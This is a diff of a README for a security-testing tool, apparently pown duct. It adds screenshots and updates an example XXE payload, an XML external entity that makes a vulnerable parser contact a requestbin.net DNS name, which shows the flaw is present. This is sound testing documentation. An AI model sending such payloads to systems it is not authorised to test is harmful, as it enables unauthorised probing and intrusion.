@@ -95,12 +95,14 @@ First, we need a disposable dns name to resolve:
 $ pown duct dns
 ```
 
+![screenshot](https://media.githubusercontent.com/media/pownjs/pown-duct/master/screenshots/01.png)
+
 Using the provided DNS, compose your payload. For example, the following could trigger trigger DNS resolution if XXE vulnerability is present.
 
 ```xml
 <!DOCTYPE foo [
 <!ELEMENT foo ANY>
-<!ENTITY bar SYSTEM "http://showmethemoney.f92839570333a5d62743.d.requestbin.net">
+<!ENTITY bar SYSTEM "http://showmethemoney.bfa8b8d3c25f09d5429f.d.requestbin.net">
 ]>
 <foo>
 &bar;
@@ -108,3 +110,5 @@ Using the provided DNS, compose your payload. For example, the following could t
 ```
 
 If the attack was successful, we will get a message in the terminal.
+
+![screenshot](https://media.githubusercontent.com/media/pownjs/pown-duct/master/screenshots/02.png)
